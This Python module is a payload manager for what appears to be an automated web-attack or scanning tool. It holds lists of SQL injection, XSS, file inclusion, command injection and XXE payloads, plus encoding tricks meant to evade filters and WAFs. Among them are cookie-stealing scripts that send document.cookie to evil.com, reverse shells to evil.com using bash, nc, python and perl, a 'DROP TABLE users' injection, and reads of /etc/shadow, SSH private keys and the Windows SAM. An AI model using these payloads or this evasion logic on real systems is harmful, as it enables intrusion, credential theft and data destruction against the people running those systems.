#!/usr/bin/env python3
"""
Payload Manager
==============

Intelligent payload management system with:
- Advanced payload crafting strategies
- Context-aware payload generation
- Encoding and obfuscation techniques
- Payload effectiveness evaluation
- Adaptive payload selection based on responses
"""

import re
import json
import time
import random
import hashlib
from typing import Dict, List, Optional, Any, Tuple, Set
from dataclasses import dataclass, field
from enum import Enum
import logging
import urllib.parse

logger = logging.getLogger(__name__)

class PayloadCategory(Enum):
    """Payload categories for organization"""
    BASIC = "basic"
    ADVANCED = "advanced"
    BYPASS = "bypass"
    TIME_BASED = "time_based"
    ERROR_BASED = "error_based"
    UNION_BASED = "union_based"
    BLIND = "blind"
    OOB = "out_of_band"

class EncodingType(Enum):
    """Encoding types for payload obfuscation"""
    NONE = "none"
    URL = "url"
    HTML = "html"
    BASE64 = "base64"
    UNICODE = "unicode"
    HEX = "hex"
    DOUBLE_URL = "double_url"
    CASE_MIX = "case_mix"
    COMMENT_INSERTION = "comment_insertion"

@dataclass
class Payload:
    """Enhanced payload with metadata"""
    value: str
    category: PayloadCategory
    encoding: EncodingType = EncodingType.NONE
    effectiveness: float = 0.0
    success_count: int = 0
    failure_count: int = 0
    last_used: float = 0.0
    tags: List[str] = field(default_factory=list)
    context_hints: List[str] = field(default_factory=list)

    def __post_init__(self):
        if not self.tags:
            self.tags = []
        if not self.context_hints:
            self.context_hints = []

class PayloadManager:
    """Intelligent payload management and generation"""

    def __init__(self):
        self.payload_cache: Dict[str, List[Payload]] = {}
        self.encoding_techniques = {
            EncodingType.URL: self._url_encode,
            EncodingType.HTML: self._html_encode,
            EncodingType.BASE64: self._base64_encode,
            EncodingType.UNICODE: self._unicode_encode,
            EncodingType.HEX: self._hex_encode,
            EncodingType.DOUBLE_URL: self._double_url_encode,
            EncodingType.CASE_MIX: self._case_mix_encode,
            EncodingType.COMMENT_INSERTION: self._comment_insertion_encode
        }

    def generate_contextual_payloads(self, vulnerability_type: str, target_url: str,
                                   context: str = "", llm_manager = None) -> List[Payload]:
        """Generate context-aware payloads for a vulnerability type"""
        cache_key = f"{vulnerability_type}_{hashlib.md5(target_url.encode()).hexdigest()}"

        if cache_key in self.payload_cache:
            logger.info(f"Using cached payloads for {vulnerability_type}")
            return self.payload_cache[cache_key]

        # Generate payloads using LLM if available
        if llm_manager:
            raw_payloads = llm_manager.generate_payloads(vulnerability_type, target_url, context)
        else:
            raw_payloads = self._get_base_payloads(vulnerability_type)

        # Convert to Payload objects with metadata
        payloads = []
        for i, payload_text in enumerate(raw_payloads):
            payload = Payload(
                value=payload_text,
                category=self._categorize_payload(payload_text, vulnerability_type),
                effectiveness=self._calculate_base_effectiveness(payload_text, vulnerability_type),
                tags=self._extract_tags(payload_text),
                context_hints=self._extract_context_hints(payload_text, context)
            )
            payloads.append(payload)

        # Generate encoded variants
        encoded_payloads = self._generate_encoded_variants(payloads, vulnerability_type)

        # Combine and sort by effectiveness
        all_payloads = payloads + encoded_payloads
        all_payloads.sort(key=lambda p: p.effectiveness, reverse=True)

        self.payload_cache[cache_key] = all_payloads[:50]  # Cache top 50
        logger.info(f"Generated {len(all_payloads)} contextual payloads for {vulnerability_type}")

        return all_payloads

    def _get_base_payloads(self, vulnerability_type: str) -> List[str]:
        """Get base payloads for vulnerability type"""
        payloads = {
            'sql_injection': [
                "' OR '1'='1",
                "'; DROP TABLE users; --",
                "' UNION SELECT NULL,NULL,NULL--",
                "admin'--",
                "' OR 1=1#",
                "') OR ('1'='1",
                "' WAITFOR DELAY '0:0:5'--",
                "'; EXEC xp_cmdshell('dir'); --",
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                "' OR SLEEP(5)--",
                "' UNION SELECT database(),user(),version()--",
                "' AND 1=0 UNION SELECT schema_name FROM information_schema.schemata--",
                "'; IF (1=1) WAITFOR DELAY '0:0:5'--",
                "' AND (SELECT 1 FROM dual)--",
                "' AND SLEEP(5)--",
                "' AND BENCHMARK(5000000,MD5(1))--",
                "' AND (SELECT COUNT(*) FROM sys.tables)>0--",
                "'; SELECT pg_sleep(5); --",
                "' AND IF(1=1, SLEEP(5), 0)--",
                "' UNION SELECT 1,2,3--",
                "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--"
            ],
            'xss': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
                "<svg onload=alert('XSS')>",
                "'\"><script>alert('XSS')</script>",
                "<iframe src=javascript:alert('XSS')>",
                "<body onload=alert('XSS')>",
                "<script>document.location='http://evil.com/'+document.cookie</script>",
                "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
                "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS')\">",
                "<script>window.location='javascript:alert(1)'</script>",
                "<input onfocus=alert(1) autofocus>",
                "<div onmouseover=\"alert('XSS')\">Hover me</div>",
                "<style>body{ background-image: url('javascript:alert(1)') }</style>",
                "<script>alert(document.domain)</script>",
                "<script>alert(document.cookie)</script>",
                "<script>alert(localStorage.getItem('token'))</script>",
                "<script>document.write('<script src=http://evil.com/xss.js></script>')</script>",
                "<object data='javascript:alert(1)'></object>",
                "<embed src='javascript:alert(1)'>"
            ],
            'lfi': [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd",
                "php://filter/read=convert.base64-encode/resource=index.php",
                "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
                "/proc/self/environ",
                "expect://id",
                "file:///etc/passwd",
                "../../../etc/shadow",
                "../../../var/log/apache2/access.log",
                "../../../home/user/.ssh/id_rsa",
                "php://input",
                "zip://shell.php%23payload",
                "phar://test.phar/test.txt",
                "../../../proc/version",
                "../../../etc/hosts",
                "../../../etc/apache2/apache2.conf",
                "../../../usr/local/etc/php/php.ini",
                "..\\..\\..\\boot.ini",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//....//etc/passwd",
                ".....///.....///.....///etc/passwd"
            ],
            'command_injection': [
                "; ls -la",
                "| whoami",
                "& dir",
                "; cat /etc/passwd",
                "| id",
                "; wget http://evil.com/shell.php",
                "`whoami`",
                "$(id)",
                "; nc -e /bin/sh evil.com 4444",
                "| curl http://evil.com/$(whoami)",
                "; ping -c 4 127.0.0.1",
                "& timeout 10",
                "; sleep 5",
                "| base64 -d",
                "; echo 'test' > /tmp/test",
                "$(cat /etc/passwd)",
                "; id; uname -a; date",
                "& whoami && echo 'success'",
                "; id || echo 'failed'",
                "| grep -i error",
                "; ps aux | grep root",
                "& netstat -an",
                "; find / -name '*.conf' 2>/dev/null | head -5",
                "| awk '{print $1}'",
                "; sed -n '1p' /etc/passwd",
                "& cut -d: -f1 /etc/passwd",
                "; tail -5 /var/log/auth.log",
                "| head -1",
                "; wc -l /etc/passwd",
                "& sort /etc/passwd"
            ],
            'xxe': [
                '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///c:/windows/win.ini">]><root>&test;</root>',
                '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd"> %xxe;]>',
                '<?xml version="1.0"?><!DOCTYPE data SYSTEM "http://evil.com/evil.dtd"><data>&send;</data>',
                '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % payload SYSTEM "file:///etc/passwd"> %payload;]>',
                '<!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/shadow">]><root>&test;</root>',
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">&#x25; file;]><root>&file;</root>',
                '<!DOCTYPE root [<!ENTITY % remote SYSTEM "http://evil.com/malicious.xml"> %remote;]>',
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://internal.network/admin">]><root>&test;</root>',
                '<!DOCTYPE root [<!ENTITY % init SYSTEM "file:///etc/passwd">%init;]>',
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "ftp://evil.com/malicious.dtd">]><root>&test;</root>',
                '<!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/hosts"><!ENTITY % dtd SYSTEM "http://evil.com/malicious.dtd">%dtd;]>',
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % param1 SYSTEM "file:///etc/passwd"><!ENTITY &#x25; param1;]>'
            ]
        }
        return payloads.get(vulnerability_type, [])

    def _categorize_payload(self, payload: str, vulnerability_type: str) -> PayloadCategory:
        """Categorize payload based on content and type"""
        payload_lower = payload.lower()

        # Time-based detection
        if any(keyword in payload_lower for keyword in ['sleep', 'waitfor', 'benchmark', 'delay', 'pg_sleep']):
            return PayloadCategory.TIME_BASED

        # Error-based detection
        if any(keyword in payload_lower for keyword in ['and 1=0', 'or 1=1', 'and false', 'or true']):
            return PayloadCategory.ERROR_BASED

        # Union-based detection
        if 'union' in payload_lower and 'select' in payload_lower:
            return PayloadCategory.UNION_BASED

        # Bypass technique detection
        if any(keyword in payload_lower for keyword in ['%252f', '%2e%2e', '....//', '..\\..\\..']):
            return PayloadCategory.BYPASS

        # Out-of-band detection
        if 'http://' in payload_lower or 'ftp://' in payload_lower:
            return PayloadCategory.OOB

        # Blind detection
        if payload_lower.count('\'') > 2 or payload_lower.count('"') > 2:
            return PayloadCategory.BLIND

        # Advanced detection based on length and complexity
        if len(payload) > 50 or payload.count('(') > 1 or payload.count(')') > 1:
            return PayloadCategory.ADVANCED

        return PayloadCategory.BASIC

    def _calculate_base_effectiveness(self, payload: str, vulnerability_type: str) -> float:
        """Calculate base effectiveness score for a payload"""
        score = 0.5  # Base score

        # Length-based scoring (prefer medium length)
        if 10 <= len(payload) <= 100:
            score += 0.2
        elif len(payload) > 100:
            score += 0.1

        # Complexity scoring
        if payload.count('(') > 0:
            score += 0.1
        if payload.count(')') > 0:
            score += 0.1
        if 'union' in payload.lower():
            score += 0.2
        if 'select' in payload.lower():
            score += 0.2

        # Encoding scoring
        if '%' in payload:
            score += 0.1
        if 'http://' in payload.lower():
            score += 0.2

        return min(score, 1.0)

    def _extract_tags(self, payload: str) -> List[str]:
        """Extract tags from payload for categorization"""
        tags = []

        if 'union' in payload.lower():
            tags.append('union')
        if 'select' in payload.lower():
            tags.append('select')
        if 'drop' in payload.lower():
            tags.append('drop')
        if 'sleep' in payload.lower():
            tags.append('time-based')
        if 'benchmark' in payload.lower():
            tags.append('benchmark')
        if 'http://' in payload.lower():
            tags.append('oob')
        if 'ftp://' in payload.lower():
            tags.append('ftp')
        if 'file://' in payload.lower():
            tags.append('file-protocol')

        return tags

    def _extract_context_hints(self, payload: str, context: str) -> List[str]:
        """Extract context hints for adaptive payload selection"""
        hints = []

        # Technology-specific hints
        if 'php' in context.lower():
            hints.append('php')
        if 'asp' in context.lower():
            hints.append('asp')
        if 'jsp' in context.lower():
            hints.append('jsp')
        if 'mysql' in context.lower():
            hints.append('mysql')
        if 'postgres' in context.lower():
            hints.append('postgresql')

        # Error message hints
        if 'mysql' in context.lower():
            hints.append('mysql_error')
        if 'oracle' in context.lower():
            hints.append('oracle_error')
        if 'microsoft' in context.lower():
            hints.append('mssql_error')

        return hints

    def _generate_encoded_variants(self, payloads: List[Payload], vulnerability_type: str) -> List[Payload]:
        """Generate encoded variants of payloads"""
        encoded_payloads = []

        for payload in payloads[:10]:  # Limit to first 10 for encoding
            for encoding_type in EncodingType:
                if encoding_type == EncodingType.NONE:
                    continue

                try:
                    encoded_value = self.encoding_techniques[encoding_type](payload.value)

                    encoded_payload = Payload(
                        value=encoded_value,
                        category=payload.category,
                        encoding=encoding_type,
                        effectiveness=payload.effectiveness * 0.8,  # Slight penalty for encoding
                        tags=payload.tags.copy(),
                        context_hints=payload.context_hints.copy()
                    )

                    # Add encoding-specific tags
                    encoded_payload.tags.append(f"encoded_{encoding_type.value}")

                    encoded_payloads.append(encoded_payload)

                except Exception as e:
                    logger.warning(f"Failed to encode payload with {encoding_type}: {e}")
                    continue

        return encoded_payloads

    def _url_encode(self, payload: str) -> str:
        """URL encode payload"""
        return urllib.parse.quote(payload)

    def _html_encode(self, payload: str) -> str:
        """HTML encode payload"""
        return payload.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;')

    def _base64_encode(self, payload: str) -> str:
        """Base64 encode payload"""
        import base64
        return base64.b64encode(payload.encode()).decode()

    def _unicode_encode(self, payload: str) -> str:
        """Unicode encode payload"""
        return ''.join(f'\\u{ord(c):04x}' for c in payload)

    def _hex_encode(self, payload: str) -> str:
        """Hex encode payload"""
        return ''.join(f'\\x{ord(c):02x}' for c in payload)

    def _double_url_encode(self, payload: str) -> str:
        """Double URL encode payload"""
        return urllib.parse.quote(urllib.parse.quote(payload))

    def _case_mix_encode(self, payload: str) -> str:
        """Mix case in payload"""
        result = []
        for char in payload:
            if random.random() > 0.5:
                result.append(char.upper())
            else:
                result.append(char.lower())
        return ''.join(result)

    def _comment_insertion_encode(self, payload: str) -> str:
        """Insert comments to bypass filters"""
        if len(payload) < 5:
            return payload

        # Insert random comments
        words = payload.split()
        if len(words) > 1:
            insert_pos = random.randint(1, len(words) - 1)
            words.insert(insert_pos, '/**/')
            return ' '.join(words)

        return payload

    def update_payload_effectiveness(self, payload: Payload, success: bool, response_time: float = 0) -> None:
        """Update payload effectiveness based on test results"""
        if success:
            payload.success_count += 1
            # Boost effectiveness for fast successful payloads
            if response_time > 0 and response_time < 5:
                payload.effectiveness = min(payload.effectiveness + 0.3, 1.0)
            else:
                payload.effectiveness = min(payload.effectiveness + 0.2, 1.0)
        else:
            payload.failure_count += 1
            # Reduce effectiveness for failed payloads
            payload.effectiveness = max(payload.effectiveness - 0.1, 0.0)

        payload.last_used = time.time()

    def get_best_payloads(self, vulnerability_type: str, count: int = 5) -> List[Payload]:
        """Get the best performing payloads for a vulnerability type"""
        cache_key = f"{vulnerability_type}_best"

        if cache_key in self.payload_cache:
            cached_payloads = self.payload_cache[cache_key]
            if len(cached_payloads) >= count:
                return cached_payloads[:count]

        # Get contextual payloads and sort by effectiveness
        all_payloads = self.generate_contextual_payloads(vulnerability_type, "")

        # Sort by effectiveness and usage history
        sorted_payloads = sorted(all_payloads, key=lambda p: (
            p.effectiveness,
            p.success_count - p.failure_count,
            -p.last_used
        ), reverse=True)

        self.payload_cache[cache_key] = sorted_payloads
        return sorted_payloads[:count]

    def adapt_payloads(self, vulnerability_type: str, failed_payloads: List[str],
                      successful_responses: List[str]) -> List[Payload]:
        """Adapt payloads based on previous test results"""
        # Analyze failed payloads to understand why they failed
        adaptation_strategies = self._analyze_failures(failed_payloads, successful_responses)

        # Generate adapted payloads
        adapted_payloads = []

        for strategy in adaptation_strategies:
            if strategy == 'increase_complexity':
                adapted_payloads.extend(self._generate_complex_variants(vulnerability_type))
            elif strategy == 'try_different_encoding':
                adapted_payloads.extend(self._generate_alternative_encodings(vulnerability_type))
            elif strategy == 'use_time_based':
                adapted_payloads.extend(self._generate_time_based_variants(vulnerability_type))

        return adapted_payloads[:10]

    def _analyze_failures(self, failed_payloads: List[str], successful_responses: List[str]) -> List[str]:
        """Analyze failed payloads to determine adaptation strategy"""
        strategies = []

        # Check for WAF indicators in responses
        waf_indicators = ['blocked', 'forbidden', '403', 'security', 'waf', 'blocked']
        has_waf = any(any(indicator in response.lower() for indicator in waf_indicators)
                     for response in successful_responses)

        if has_waf:
            strategies.append('try_different_encoding')
            strategies.append('increase_complexity')

        # Check for input validation
        if any(len(payload) < 10 for payload in failed_payloads):
            strategies.append('increase_complexity')

        # Check for time-based success
        if any('timeout' in response.lower() or 'delay' in response.lower()
               for response in successful_responses):
            strategies.append('use_time_based')

        return strategies

    def _generate_complex_variants(self, vulnerability_type: str) -> List[Payload]:
        """Generate more complex payload variants"""
        # This would implement logic to create more sophisticated payloads
        # For now, return basic advanced payloads
        complex_payloads = {
            'sql_injection': [
                "' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=database() AND column_name LIKE '%pass%')>0--",
                "' UNION SELECT CONCAT(table_name, ':', column_name) FROM information_schema.columns--",
                "' AND IF(1=1, SLEEP(5), 0)--"
            ],
            'xss': [
                "<script>var x=new XMLHttpRequest();x.open('GET','http://evil.com/c='+document.cookie);</script>",
                "<script>navigator.sendBeacon('http://evil.com', document.cookie)</script>",
                "<script>fetch('http://evil.com/c='+btoa(document.cookie))</script>"
            ],
            'lfi': [
                "php://filter/read=convert.base64-encode/resource=../../../etc/passwd",
                "zip://../../../etc/passwd%23payload",
                "data://text/plain;base64,UEFZU0VSVj1vbg=="
            ],
            'command_injection': [
                "; bash -i >& /dev/tcp/evil.com/4444 0>&1",
                "| python3 -c 'import socket;s=socket.socket();s.connect((\"evil.com\",4444))'",
                "; perl -e 'use Socket;$i=\"evil.com\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"
            ],
            'xxe': [
                '<!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://evil.com/malicious.dtd">%dtd;]>',
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM \"expect://id\">]><root>&test;</root>',
                '<!DOCTYPE root [<!ENTITY &#x25; file SYSTEM \"file:///etc/passwd\"> &#x25; file; ]><root>&file;</root>'
            ]
        }

        payloads = []
        for payload_text in complex_payloads.get(vulnerability_type, []):
            payloads.append(Payload(
                value=payload_text,
                category=PayloadCategory.ADVANCED,
                effectiveness=0.8,
                tags=['complex', 'advanced']
            ))

        return payloads

    def _generate_alternative_encodings(self, vulnerability_type: str) -> List[Payload]:
        """Generate payloads with alternative encodings"""
        # This would implement different encoding strategies
        # For now, return a subset of encoded payloads
        base_payloads = self._get_base_payloads(vulnerability_type)[:3]

        alternative_payloads = []
        for payload_text in base_payloads:
            for encoding in [EncodingType.BASE64, EncodingType.HEX, EncodingType.UNICODE]:
                try:
                    if encoding == EncodingType.BASE64:
                        encoded = self._base64_encode(payload_text)
                    elif encoding == EncodingType.HEX:
                        encoded = self._hex_encode(payload_text)
                    elif encoding == EncodingType.UNICODE:
                        encoded = self._unicode_encode(payload_text)

                    alternative_payloads.append(Payload(
                        value=encoded,
                        category=PayloadCategory.BYPASS,
                        encoding=encoding,
                        effectiveness=0.7,
                        tags=['encoded', encoding.value, 'bypass']
                    ))
                except Exception:
                    continue

        return alternative_payloads

    def _generate_time_based_variants(self, vulnerability_type: str) -> List[Payload]:
        """Generate time-based payload variants"""
        time_payloads = {
            'sql_injection': [
                "' AND IF(1=1, SLEEP(5), 0)--",
                "' AND BENCHMARK(5000000, MD5(1))--",
                "'; SELECT pg_sleep(5); --",
                "' WAITFOR DELAY '0:0:5'--"
            ],
            'command_injection': [
                "; sleep 5",
                "& timeout 10",
                "| ping -c 5 127.0.0.1",
                "; usleep 5000000"
            ]
        }

        payloads = []
        for payload_text in time_payloads.get(vulnerability_type, []):
            payloads.append(Payload(
                value=payload_text,
                category=PayloadCategory.TIME_BASED,
                effectiveness=0.6,
                tags=['time-based', 'blind']
            ))

        return payloads

    def cleanup_cache(self, max_age: int = 3600) -> int:
        """Clean up old cached payloads"""
        current_time = time.time()
        removed_count = 0

        for cache_key in list(self.payload_cache.keys()):
            # Remove entries older than max_age
            oldest_payload_time = min(p.last_used for p in self.payload_cache[cache_key] if p.last_used > 0)
            if current_time - oldest_payload_time > max_age:
                del self.payload_cache[cache_key]
                removed_count += 1

        logger.info(f"Cleaned up {removed_count} cached payload entries")
        return removed_count

# Global payload manager instance
payload_manager = PayloadManager()